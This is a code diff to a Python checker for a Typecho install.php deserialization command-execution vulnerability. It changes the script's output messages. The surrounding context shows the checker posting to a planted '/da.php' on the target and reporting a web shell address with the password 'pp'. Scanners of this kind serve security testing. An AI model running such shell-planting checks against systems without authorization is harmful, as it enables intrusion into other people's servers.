@@ -34,9 +34,11 @@ class typecho_install_code_exec_BaseVerify:
             req1 = requests.post(self.url + "/da.php", data=post_data, headers=headers, timeout=10, verify=False)
             if r"Configuration File (php.ini) Path" in req1.text:
                 cprint("[+]存在typecho install.php反序列化命令执行漏洞...(高危)\tpayload: "+vulnurl+"\tshell地址: "+shellpath+"\t密码: pp", "red")
+            else:
+                cprint("[-]不存在typecho_install_code_exec漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
